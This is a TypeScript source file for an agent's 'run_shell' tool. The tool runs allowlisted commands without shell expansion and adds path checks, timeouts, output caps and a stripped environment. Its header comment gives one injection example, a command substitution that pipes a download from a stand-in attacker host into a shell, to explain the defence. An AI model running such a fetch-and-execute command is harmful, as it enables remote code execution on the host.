// run_shell — execute a single command (NO shell expansion) under
// AGENT_FS_ROOT, with argv[0] restricted to AGENT_SHELL_ALLOWLIST.
//
// Critical security properties:
//   1. NO shell interpretation. We spawn directly with `spawn`, not exec —
//      so `$(curl evil.com | sh)` in args is a literal string, not code.
//   2. argv[0] must be in the operator-supplied allowlist. Empty allowlist
//      means the tool refuses every call.
//   3. cwd must be under AGENT_FS_ROOT (path-escape check via _fs_root).
//   4. Hard wall-clock timeout via the `timeout` option to spawn.
//   5. stdout/stderr capped at 256 KiB each — long-running build output
//      gets truncated rather than blowing memory.
//   6. Default-disabled — the dependencies.ts wiring only registers this
//      tool when AGENT_FS_TOOLS_ENABLED=true.
//
// Permission policies STILL apply on top of the allowlist. The allowlist
// is the secondary belt; permission_policies is the suspenders. Operators
// should configure both.

import { spawn } from "node:child_process";
import { z } from "zod";
import { defineTool } from "../tool.js";
import { resolveAndCheckPath } from "./_fs_root.js";

export const RunShellIn = z.object({
  /** argv[0] — the executable. Must match AGENT_SHELL_ALLOWLIST exactly. */
  command: z.string().min(1).max(256),
  /** argv[1..]. No shell expansion; passed through directly. */
  args: z.array(z.string().max(4096)).max(64).default([]),
  /** Working directory relative to AGENT_FS_ROOT (or absolute under it). */
  cwd: z.string().max(4096).default("."),
  /** Stdin payload, capped at 64 KiB. */
  stdin: z.string().max(65_536).optional(),
});
export type RunShellInput = z.infer<typeof RunShellIn>;

export const RunShellOut = z.object({
  exit_code: z.number().nullable(),
  /** True when the wall-clock timeout fired. */
  timed_out: z.boolean(),
  /** UTF-8 stdout, capped at 256 KiB; `stdout_truncated=true` when capped. */
  stdout: z.string(),
  stdout_truncated: z.boolean(),
  /**
   * Bytes the child wrote to stdout AFTER the 256 KiB cap was reached. 0 when
   * not truncated. Lets the model decide whether to escalate (re-run with
   * narrower scope, redirect to a file) instead of guessing whether the
   * dropped tail was 1 KB or 100 MB.
   */
  stdout_discarded_bytes: z.number(),
  stderr: z.string(),
  stderr_truncated: z.boolean(),
  /** Bytes the child wrote to stderr AFTER the cap was reached. 0 when not truncated. */
  stderr_discarded_bytes: z.number(),
  duration_ms: z.number(),
});
export type RunShellOutput = z.infer<typeof RunShellOut>;

const MAX_STREAM_BYTES = 262_144; // 256 KiB per stream.

export interface RunShellOptions {
  root: string;
  /** Allowlist of argv[0] commands. Empty disables tool. */
  allowlist: string[];
  timeoutMs: number;
}

export function buildRunShellTool(opts: RunShellOptions) {
  const allowSet = new Set(
    opts.allowlist.map((c) => c.trim()).filter((c): c is string => c.length > 0),
  );
  return defineTool({
    id: "run_shell",
    description:
      "Execute a single command under AGENT_FS_ROOT (NO shell expansion). " +
      "`command` must be in AGENT_SHELL_ALLOWLIST. `args` are passed through " +
      "literally — pipes, redirection, $VAR expansion DO NOT WORK. Use " +
      "stdout / stderr from the response. Hard timeout per AGENT_SHELL_TIMEOUT_MS. " +
      "Both streams are capped at 256 KiB; `stdout_truncated` / `stderr_truncated` " +
      "flag truncation, and `stdout_discarded_bytes` / `stderr_discarded_bytes` " +
      "report how much of the tail was dropped so you can re-run with narrower scope.",
    inputSchema: RunShellIn,
    outputSchema: RunShellOut,
    annotations: { readOnly: false },

    execute: async (_ctx, input): Promise<RunShellOutput> => {
      if (allowSet.size === 0) {
        throw new Error(
          "run_shell is disabled — AGENT_SHELL_ALLOWLIST is empty. " +
            "Operators must configure an allowlist before this tool can run.",
        );
      }
      // Reject anything that looks like a path so the allowlist can't be
      // bypassed by passing `/usr/bin/ls` when only `ls` is allowlisted.
      // Allowlist entries MUST be bare executable names; the spawned
      // command resolves through PATH (which we control via the env
      // strip below).
      if (input.command.includes("/") || input.command.includes("\\")) {
        throw new Error(
          `command '${input.command}' contains a path separator; ` +
            `AGENT_SHELL_ALLOWLIST entries must be bare executable names ` +
            `(e.g. 'ls', not '/usr/bin/ls'). PATH resolution handles the rest.`,
        );
      }
      if (!allowSet.has(input.command)) {
        throw new Error(
          `command '${input.command}' is not in AGENT_SHELL_ALLOWLIST ` +
            `(allowed: ${Array.from(allowSet).join(", ")})`,
        );
      }
      const cwd = input.cwd ?? ".";
      const cwdAbs = await resolveAndCheckPath(opts.root, cwd, true);
      const argv = input.args ?? [];

      const start = Date.now();
      return await new Promise<RunShellOutput>((resolveP, rejectP) => {
        const child = spawn(input.command, argv, {
          cwd: cwdAbs,
          shell: false,
          timeout: opts.timeoutMs,
          env: {
            // Strip parent env to a minimal set so the shelled-out tool
            // doesn't inherit credentials. Operators who need extra env
            // should fork this tool or configure the executable itself.
            PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin",
            // Inherit HOME so tools that need user config (git → ~/.gitconfig,
            // npm → ~/.npmrc, ssh → ~/.ssh) keep working. Earlier we set
            // HOME=cwdAbs as belt-and-suspenders sandboxing, but that
            // silently broke common allowlist candidates (git, npm, gh)
            // with no error message. The trust boundary is the allowlist
            // + path-escape check + stripped env; HOME=cwd doesn't add
            // meaningful protection on top of those.
            HOME: process.env.HOME ?? cwdAbs,
            LANG: "C.UTF-8",
          },
          stdio: ["pipe", "pipe", "pipe"],
        });

        let stdoutBytes = 0;
        let stderrBytes = 0;
        let stdoutTruncated = false;
        let stderrTruncated = false;
        let stdoutDiscarded = 0;
        let stderrDiscarded = 0;
        const stdoutChunks: Buffer[] = [];
        const stderrChunks: Buffer[] = [];

        child.stdout.on("data", (chunk: Buffer) => {
          if (stdoutBytes >= MAX_STREAM_BYTES) {
            stdoutTruncated = true;
            stdoutDiscarded += chunk.length;
            return;
          }
          const remaining = MAX_STREAM_BYTES - stdoutBytes;
          if (chunk.length > remaining) {
            stdoutChunks.push(chunk.subarray(0, remaining));
            stdoutBytes = MAX_STREAM_BYTES;
            stdoutTruncated = true;
            stdoutDiscarded += chunk.length - remaining;
          } else {
            stdoutChunks.push(chunk);
            stdoutBytes += chunk.length;
          }
        });
        child.stderr.on("data", (chunk: Buffer) => {
          if (stderrBytes >= MAX_STREAM_BYTES) {
            stderrTruncated = true;
            stderrDiscarded += chunk.length;
            return;
          }
          const remaining = MAX_STREAM_BYTES - stderrBytes;
          if (chunk.length > remaining) {
            stderrChunks.push(chunk.subarray(0, remaining));
            stderrBytes = MAX_STREAM_BYTES;
            stderrTruncated = true;
            stderrDiscarded += chunk.length - remaining;
          } else {
            stderrChunks.push(chunk);
            stderrBytes += chunk.length;
          }
        });

        if (input.stdin) {
          child.stdin.write(input.stdin);
          child.stdin.end();
        } else {
          child.stdin.end();
        }

        child.on("error", (err) => {
          // ENOENT (executable not found) is the unrecoverable case.
          if ((err as NodeJS.ErrnoException).code === "ENOENT") {
            rejectP(new Error(`command '${input.command}' not found on PATH`));
            return;
          }
          rejectP(err);
        });

        child.on("close", (code, signal) => {
          // node treats a `timeout`-killed child as signal=SIGTERM with
          // exit code null. Surface that explicitly so the model knows
          // the tool wasn't a normal failure.
          const timedOut =
            (signal === "SIGTERM" || signal === "SIGKILL") && code === null;
          resolveP({
            exit_code: code,
            timed_out: timedOut,
            stdout: Buffer.concat(stdoutChunks).toString("utf8"),
            stdout_truncated: stdoutTruncated,
            stdout_discarded_bytes: stdoutDiscarded,
            stderr: Buffer.concat(stderrChunks).toString("utf8"),
            stderr_truncated: stderrTruncated,
            stderr_discarded_bytes: stderrDiscarded,
            duration_ms: Date.now() - start,
          });
        });
      });
    },
  });
}
